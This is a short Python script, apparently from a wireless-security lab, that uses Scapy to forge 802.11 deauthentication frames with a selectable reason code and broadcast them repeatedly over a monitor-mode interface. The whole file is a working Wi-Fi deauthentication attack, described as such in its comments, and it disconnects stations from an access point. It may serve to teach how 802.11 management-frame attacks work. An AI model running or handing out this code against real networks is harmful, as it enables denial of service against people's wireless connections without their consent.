# This script send deauthentication packet to the target set in the file.
# To modify:
# 	- dest_mac: the target
# 	- src_mac: the source
# The user can choose the reason in the proposed list.

from scapy.all import *

# Destination: station, here broadcast
dest_mac = "ff:ff:ff:ff:ff:ff"
# Source: access point
src_mac = ""

# Reason to add to the packet
r = input("Choose a reason:\n"
	"1 - Unspecified\n"
	"4 - Disassociated due to inactivity\n"
	"5 - Disassociated because AP is unable to handle all currently associated stations\n"
	"8 - Deauthenticated because sending STA is leaving BSS\n")

# For the reason 5 and 8, the target is the AP -> swap dest<->src
if (r == '5' or r == '8'):
      dest_mac, src_mac = src_mac, dest_mac

# Creation of the 802.11 frame
# Subtype 12 = deauthentication
# addr1: destination
# addr2: source
# addr3: AP
frame = Dot11(type=0, subtype=12, addr1=dest_mac, addr2=src_mac, addr3=src_mac)

# Creation of the 802.11 packet
packet = RadioTap()/frame/Dot11Deauth(reason=int(r))

# Send the packet each 100ms, 100 times. -> This attack lasts 10 seconds
# The verbose mode print a point for a packet sent, and the the total amount at the end.
sendp(packet, inter=0.1, count=100, iface="wlan0mon", verbose=1)